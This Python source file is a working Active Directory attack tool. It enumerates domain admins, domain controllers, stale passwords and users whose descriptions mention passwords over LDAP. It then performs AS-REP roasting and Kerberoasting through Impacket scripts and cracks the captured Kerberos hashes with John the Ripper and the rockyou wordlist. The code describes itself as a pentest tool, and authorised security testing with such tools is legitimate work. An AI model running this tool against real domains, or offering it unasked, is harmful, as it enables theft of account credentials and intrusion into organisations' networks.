import ldap
from pwn import log 
import subprocess
import argparse
import datetime, time
import re
import math
import socket
from shutil import which
from os import path

# Style
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def highlightGreen(msg):
    return bcolors.OKGREEN + msg + bcolors.ENDC
def highlightRed(msg):
    return bcolors.FAIL + msg + bcolors.ENDC
def styleBlue(msg):
    return '\033[34m' + msg + bcolors.ENDC
def styleYellow(msg):
    return '\033[33m' + msg + bcolors.ENDC
def styleGreen(msg):
    return '\033[92m'  + msg + bcolors.ENDC
def StyleBold(msg):
    return bcolors.BOLD + msg + bcolors.ENDC

def LdapPathColor(data):
    strColor = data.replace("CN=", StyleBold("CN") +"=").replace("OU=", StyleBold("OU")+"=").replace("DC=", StyleBold("DC")+"=")
    return strColor

def printTitle(msg):
    print("\n" + bcolors.BOLD + msg + bcolors.ENDC)

def CreateSpace(varString,nbSpace = 17):
    return (nbSpace - int(math.fmod(len(varString),nbSpace))) * ' '

def ResovelIpAddress(ServerName):
    try:
        data = socket.gethostbyname_ex(ServerName)
        ipAddres = data[2][0]
    except Exception:
        log.warning("Fail to resolve ServerName: " +ServerName)
        return None
    return ipAddres

class LdapEnum:
    def __init__(self, BASE_DN):
        self.baseDn = BASE_DN
        self.ldapVerson = ldap.VERSION3

    def __BannerLDAP(self):
        print("\n====================================================")
        print("===================== Enum LDAP ====================")
        print("====================================================\n\n")
        
    def __SearchUserServerLdap(self,OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH):
        try:
            result = self.ldapCon.search_s(self.baseDn, ldap.SCOPE_SUBTREE, OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH) 
        except ldap.LDAPError as error:
            log.warning(error)
            exit(0)
        resultSearch = []
        for info in result:
            if(info[0] != None):
                resultSearch.append([info[0],info[1]])
        if(len(resultSearch) == 0):
            log.warning("No entry found !")
        return resultSearch

    # Unix timestamp to the AD one
    def __datetime_to_mstimestamp(self, dt):
        timestamp = int(dt.timestamp())
        magic_number = 116_444_736_000_000_000
        shift = 10_000_000
        return (timestamp*shift) + magic_number

    def SearchUserServerLdapUser(self,OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH):
        try:
            result = self.ldapCon.search_s(self.baseDn, ldap.SCOPE_SUBTREE, OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH) 
        except ldap.LDAPError as error:
            print(error)
            exit(0)
        resultSearch = []
        for info in result:
            if(info[0] != None):
                baseName = info[0]
                username = info[1]["sAMAccountName"][0].decode()
                if(username != "krbtgt"):
                    resultSearch.append([baseName,username])
        if(len(resultSearch) == 0):
            log.warning("No entry found !")
        return resultSearch
        
    def ConnectServerLdap(self,ServerName,ipAddress, username, password, isSSL):
        log.info("Domain name: "+ServerName)
        if(username == None):
            log.info("Username:    "+StyleBold("Anonymous"))
        else:
            log.info("Username:    "+username)
        if(ipAddress == None):
            ipAddress = ResovelIpAddress(ServerName)
            if(ipAddress == None):
                log.warning("Unable to resolve domain name:  "+ServerName)
                exit(0)

        log.info("IP Address:  "+ipAddress)
        if(isSSL):
            ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
            connect = ldap.initialize('ldaps://' + ipAddress)
            log.info("SSL connect: "+highlightGreen("TRUE"))
        else:
            connect = ldap.initialize('ldap://' + ipAddress)
            log.info("SSL connect: "+highlightRed("FALSE"))
        print()

        connect.protocol_version = self.ldapVerson
        try:
            if(username == None and password == None):
                connect.simple_bind_s(username, password)
            else:
                if(password == None):
                    password == ''
                connect.simple_bind_s(username, password)            
        except ldap.INVALID_CREDENTIALS:
            log.failure('Invalid credentials !')
            self.ldapCon = None
            return 
        except ldap.SERVER_DOWN:
            log.failure("Server down") 
            self.ldapCon = None
            return
        except ldap.LDAPError as error:
            if type(error.message) == dict and error.message.has_key('desc'):
                log.error("Other LDAP error: " + error.message['desc'])
                return 
            else: 
                log.error("Other LDAP error: " + error)
                self.ldapCon = None
            return
        log.success("Succesfully Authenticated With LDAP")
        self.ldapCon = connect
        return

    def UserOldPassword(self):
        printTitle("[-] Users with old password")

        passwordMinAge=100
        timeFilter = "(pwdLastSet<=%s)"% self.__datetime_to_mstimestamp(datetime.datetime.now() - datetime.timedelta(days=passwordMinAge))
        OBJECT_TO_SEARCH = '(&(objectCategory=user)'+timeFilter+')'
        ATTRIBUTES_TO_SEARCH = ['pwdLastSet','sAMAccountName']
        
        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            timestamp = int(info[1]['pwdLastSet'][0].decode())
            username = info[1]['sAMAccountName'][0].decode()
            if(timestamp != 0):
                value = datetime.datetime (1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000)
                now = datetime.datetime.now( )
                lastChange = now - value
                if(lastChange.days > 100):
                    log.warning("User '"+highlightRed(username) +"' password last change: " + highlightRed(str((now - value).days))+" days ago "+ value.strftime('%Y-%m-%d %H:%M:%S'))
    def GetUserAndDesciption(self):
        OBJECT_TO_SEARCH = '(&(objectCategory=user)(|(description=*pwd*)(description=*password*)))'
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName','description']

        printTitle("[-] Users with an interesting description")
        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]['sAMAccountName'][0].decode()
            description = info[1]['description'][0].decode()
            print("[i] Username:",highlightRed(username),CreateSpace(username,20),description)

    def GetDomainAdmin(self):
        OBJECT_TO_SEARCH = '(&(objectCategory=user)(adminCount=1))'
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName']

        printTitle("[-] Users who are Domain Admin")
        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]
            print("[i] Username:",highlightRed(username),CreateSpace(username), LdapPathColor(info[0]))
    def GetDomainControllers(self):
        printTitle("[-] Domain Controllers")

        OBJECT_TO_SEARCH = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName']

        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]
            print("[i] Computer:",highlightRed(username),CreateSpace(username),LdapPathColor(info[0]))
    def PasswordNotExpire(self):
        OBJECT_TO_SEARCH = '(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName']

        printTitle("[-] Users with Password Not Expire")
        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]
            print("[i] Username:",highlightRed(username),CreateSpace(username),LdapPathColor(info[0]))
    def UserDefEncrypt(self):
        printTitle("[-] Users with not the default encryption")

        OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(msDS-SupportedEncryptionTypes=*))'
        ATTRIBUTES_TO_SEARCH = ['msDS-SupportedEncryptionTypes', 'sAMAccountName']

        result = self.__SearchUserServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]['sAMAccountName'][0].decode()
            algoType = info[1]['msDS-SupportedEncryptionTypes'][0].decode()
            if(algoType == "0"):
                algoType = "Password is in a reversible encryption or in DES !"
            elif(algoType == "1"):
                algoType = "Password is stored in " + highlightRed("CRC32")
            elif(algoType == "2"):
                algoType = "Password is stored in " + highlightRed("RSA-MD5")
            elif(algoType == "4"):
                algoType = "Password is stored in " + highlightRed("RC4-HMAC-MD5")
            elif(algoType == "8"):
                algoType = "Password is stored in HMAC-SHA1-96-AES128"
            elif(algoType == "16"):
                algoType = "Password is stored in HMAC-SHA1-96-AES256"
            else: 
                 algoType = "Password is stored in "+str(algoType)+" encryption"
            print("[i] Username:",highlightRed(username),CreateSpace(username),algoType)

        return
    def UserNoDelegation(self):
        printTitle("[-] Protecting Privileged Domain Accounts")

        OBJECT_TO_SEARCH = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))'
        ATTRIBUTES_TO_SEARCH = ['sAMAccountName']

        result = self.SearchUserServerLdapUser(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        for info in result:
            username = info[1]
            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(info[0]))
            
    
    def deconnect(self):
        self.ldapCon.unbind() 

    def StartEnum(self):
        self.__BannerLDAP()

        self.GetDomainAdmin()
        self.GetDomainControllers()
        self.PasswordNotExpire()
        self.UserOldPassword()
        self.GetUserAndDesciption()
        self.UserDefEncrypt()
        self.UserNoDelegation()

class KerbExploit:
    
    def __init__(self,ldapEnum, domainName,johnPath,wordlistPath,ipAddress=None):
        self.ldapEnum = ldapEnum
        self.domainName = domainName
        self.wordlistPath = wordlistPath
        self.ipAddress = ipAddress
        self.johnPath = johnPath
    
    def __BannerAttack(self):
        print("\n\n====================================================")
        print("==================== Attack AD =====================")
        print("====================================================\n")

    def __RunImpacket(self,argProcess):
        if(self.ipAddress != None):
            argProcess.append("-dc-ip")
            argProcess.append(self.ipAddress)
        process =  subprocess.run(argProcess, check=True, stdout=subprocess.PIPE)
        return process.stdout.decode().splitlines()

    def RunJohn(self,filenName, algoType):
        isSuccess = False
        progress = log.progress("Cracking hash from file: " + highlightRed(filenName))
        process =  subprocess.run((self.johnPath, filenName,algoType, "--wordlist=" + self.wordlistPath), check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) 

        if('krb5asrep' in algoType):
            regexHashUser = r"(.*[^\s-])\s+\(\$krb5\w+\$23\$(\w+)@.+\.\w+\)"
        elif('krb5tgs' in algoType):
            regexHashUser = r"(.*[^\s-])\s+\(\?\)"
        output = process.stdout.decode()
        for output in output.splitlines():
            x = re.search(regexHashUser, output)
            if(x is not None):
                if('krb5asrep' in algoType):
                    print("",end='\t')
                    log.success("Cread Found: '" + highlightGreen(x.group(2))+":"+ highlightGreen(x.group(1))+"'")
                    isSuccess = True
                elif('krb5tgs' in algoType):
                    print("",end='\t')
                    log.success("Cread Found: '" + highlightGreen(x.group(1))+"'")
                    isSuccess = True
                else:
                    log.error('Fail get hash !')
        progress.success(status='Done')
        return isSuccess
    def __ExploitASREP(self, username, outputFile):
        isSuccess = False
        argProcess = ["GetNPUsers.py",self.domainName+"/"+username,"-no-pass"]
        output = self.__RunImpacket(argProcess)
        for line in output:
            kerbHash = line.split('$')
            if(len(kerbHash) > 1 and kerbHash[1] == "krb5asrep" and kerbHash[2] == "23"): 
                f = open(outputFile, "a+")
                f.write(line + "\n")
                f.close()
                
                isSuccess = True
        return isSuccess
    def __ExploitKerberoasting(self, targetUser, username, password, TargetService, outputFile):
        isSuccess = False
        if(username == None or password == None):
            argProcess = ["GetUserSPNs.py",self.domainName+"/","-request-user",TargetService,"-no-pass"]
        else:
            argProcess = ["GetUserSPNs.py",self.domainName+"/"+username+':'+password,"-request-user",TargetService]
        output = self.__RunImpacket(argProcess)
        for line in output:
            kerbHash = line.split('$')
            if(len(kerbHash) > 1 and kerbHash[1] == "krb5tgs" and kerbHash[2] == "23"):
                f = open(outputFile, "a+")
                f.write(line + "\n")
                f.close()
                isSuccess = True
        return isSuccess

    def ASREP_Roastable(self, outputFile = "ASREPHash.hash"):
        printTitle("[-] AS-REP Roastable Users")

        isSuccess = False
        OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
        ATTRIBUTES_TO_SEARCH = ['samAccountName']
        result = self.ldapEnum.SearchUserServerLdapUser(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        
        for info in result:
            username = info[1]
            log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(info[0]))
            isSuccess = self.__ExploitASREP(info[1], outputFile)
        if(isSuccess):
            log.success("Hash added to file:        " + outputFile)
        return isSuccess
    def Kerberoastable(self,username, password, outputFile = "kerbHash.hash"):
        printTitle("[-] Kerberoastable Users")

        isSuccess = False
        OBJECT_TO_SEARCH = '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
        ATTRIBUTES_TO_SEARCH = ['samAccountName']
        result = self.ldapEnum.SearchUserServerLdapUser(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
        
        for info in result:
            targetUsername = info[1]
            log.info("Username: " + highlightRed(targetUsername) + CreateSpace(targetUsername) + ""+LdapPathColor(info[0])+"")
            isSuccess = self.__ExploitKerberoasting(targetUsername,username, password,targetUsername, outputFile)
        if(isSuccess):
            log.success("Hash added to file:        " + outputFile)
        return isSuccess
    def DefaultConfig(self, ouputFile, formatHash):
        configDefault = {
            'ouputFile' : ouputFile,
            'formatHash' : formatHash,
            'isHashFound' : False
        }
        return configDefault
    def StartKerbExploit(self,userConfig):
        self.__BannerAttack()

        configASREP = self.DefaultConfig('ASREPHash.hash','--format=krb5asrep')
        configFileKerb = self.DefaultConfig('kerbHash.hash','--format=krb5tgs')

        configASREP['isHashFound'] = self.ASREP_Roastable(configASREP['ouputFile'])
        configFileKerb['isHashFound'] = self.Kerberoastable(userConfig['username'], userConfig['password'],configFileKerb['ouputFile'])

        if((configASREP['isHashFound'] or configFileKerb['isHashFound'])  and userConfig['baseDN']):
            printTitle("[-] Starting to crack hashs")
            if(configASREP['isHashFound']):
                self.RunJohn(configASREP['ouputFile'], configASREP['formatHash'])
            if(configFileKerb['isHashFound']):
                self.RunJohn(configFileKerb['ouputFile'], configFileKerb['formatHash'])

def ManageArg():
    parser = argparse.ArgumentParser(description='Pentest tool that detect misconfig in AD with LDAP', usage='%(prog)s -d [domain] -u [username] -p [password]')
    parser.version = 'EnumAD version: 0.1-Dev'

    parser.add_argument('-d',  metavar=' [domain]', type=str, help='The name of domain (e.g. "test.local")', required=True)
    parser.add_argument('-u',  metavar=' [username]', type=str,help='The user name', default=None)
    parser.add_argument('-p',  metavar=' [password]', type=str,help='The user password', default=None)
    parser.add_argument('-ip', metavar='[ipAddress]', type=str, help='The IP address of the server (e.g. "1.1.1.1")', default=None)

    parser.add_argument('-j',  help='Enable hash cracking (john)', action='store_true')
    parser.add_argument('-jp', metavar='[path]',type=str, help='John binary path', default="john")
    parser.add_argument('-w',  metavar=' [wordList]', type=str,help='The path of the wordlist to be used john (Default: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt', default="/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt")

    parser.add_argument('-v', '--version', action='version', help='Show program\'s version number and exit')
    parser.add_argument('-s', help='Use LDAP with SSL', action='store_true')
    try:
        args = parser.parse_args()
    except:
        exit(0)
        
    domainCut = args.d.split('.')
    if(len(domainCut) >= 2):
        BASE_DN = ''
        for dc in domainCut:
            BASE_DN += 'dc=' + dc + ','
        BASE_DN = BASE_DN[:-1]
    else:
        log.warning("The domain name '"+ args.d +"' is invalid !")
        exit(0)
    userConfig = {
            'domain' : args.d,
            'ipAddress' : args.ip,
            'username' : args.u,
            'password' : args.p,
            'isSSL' : args.s,
            'baseDN' : BASE_DN,
            'wordlistPath' : args.w,
            'isCrackingEnable' : args.j,
            'JohnPath' : args.jp
    }
    return userConfig

def CheckRequierment(userConfig):
    if(userConfig['isCrackingEnable']):
        if(not path.exists(userConfig['wordlistPath'])):
            log.warning("Wordlist '"+userConfig['wordlistPath']+"' not found !")
            exit(1)
        if(not path.exists(which(userConfig['JohnPath']))):
            log.warning("The command  '"+userConfig['JohnPath']+"' not found !")
            log.info("Link: https://github.com/openwall/john")
            exit(1)
    if(not path.exists(which('GetUserSPNs.py')) or 
    not path.exists(which('GetNPUsers.py'))):
        log.warning("Impacket must be install to run the tool !")
        log.info("Link: https://github.com/SecureAuthCorp/impacket")


def MainBanner():
    print("\n   █████╗ ██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗")
    print("  ██╔══██╗██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║")
    print("  ███████║██║  ██║    █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║")
    print("  ██╔══██║██║  ██║    ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║")
    print("  ██║  ██║██████╔╝    ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║")
    print("  ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝")
    print("\n")

def mainWork(userConfig):
    ldapEnum = LdapEnum(userConfig['baseDN'])
    ldapEnum.ConnectServerLdap(userConfig['domain'], userConfig['ipAddress'],userConfig['username'], userConfig['password'], userConfig['isSSL'])

    ldapEnum.StartEnum()

    kerbExploit = KerbExploit(ldapEnum,userConfig['domain'],userConfig['JohnPath'],userConfig['wordlistPath'],userConfig['ipAddress'])
    kerbExploit.StartKerbExploit(userConfig)

    ldapEnum.deconnect()

if __name__ == '__main__':
    MainBanner()
    userConfig= ManageArg()
    CheckRequierment(userConfig)
    mainWork(userConfig)
    print("")
    exit(0)